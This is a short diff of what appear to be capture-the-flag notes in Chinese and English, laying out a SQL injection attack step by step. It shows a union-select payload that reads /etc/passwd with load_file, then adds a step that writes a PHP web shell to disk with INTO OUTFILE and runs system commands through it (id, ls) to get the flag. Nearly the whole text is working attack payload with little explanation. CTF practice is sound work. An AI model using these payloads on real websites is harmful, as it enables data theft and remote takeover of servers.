@@ -32,3 +32,9 @@ result ： 權限列表
 1' union select 1,load_file(“/etc/passwd"),3,4,5;— -
 
 Result: path列表
+
+next: 上傳shell - > '<?php system($_request[0])?>' into outfile '<path>';-- -
+
+next: go shell的路徑 'shell.php?0=id;ls;cd ..;ls;'
+
+get flag ！！！！！！！
